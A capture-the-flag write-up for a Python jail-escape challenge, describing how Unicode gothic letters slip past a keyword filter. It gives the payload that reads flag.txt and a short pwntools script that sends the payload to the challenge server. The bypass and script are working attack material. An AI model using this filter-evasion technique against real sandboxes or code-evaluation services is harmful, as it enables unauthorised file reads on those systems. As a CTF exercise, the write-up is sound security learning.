# pyJail

> <p>Sigh.. another python jail to escape.<br>Author: hel-makh</p>
> <p><a href="attachments/chall.py"></a>chall.py<br><a href="attachments/Dockerfile"></a>Dockerfile</p>

## Path to Flag
Just like how pyjail is supposed to be, we should open `flag.txt` but with limited command. On this challenge, the maximum character length is 16.

Tried several commands until another command will exceed 16 characters, so I found out and decided to use gothics letter.

`payload: 𝔭𝔯𝔦𝔫𝔱(𝔩𝔦𝔰𝔱(𝔬𝔭𝔢𝔫('flag.txt')))`

Hence, I just create the script to automate it

```
#!/usr/bin/env python3

from pwn import *

connection = remote('20.80.240.190', 4449)

prompt = connection.recvuntil(b'> ')

connection.sendline('𝔭𝔯𝔦𝔫𝔱(𝔩𝔦𝔰𝔱(𝔬𝔭𝔢𝔫(\'flag.txt\')))')

response = connection.recvall()
print(response.decode())

connection.close()
```

`AKASEC{1t5_4ll_4b0ut_3sc4p1ng_4nd_3v4lu4T1ng}`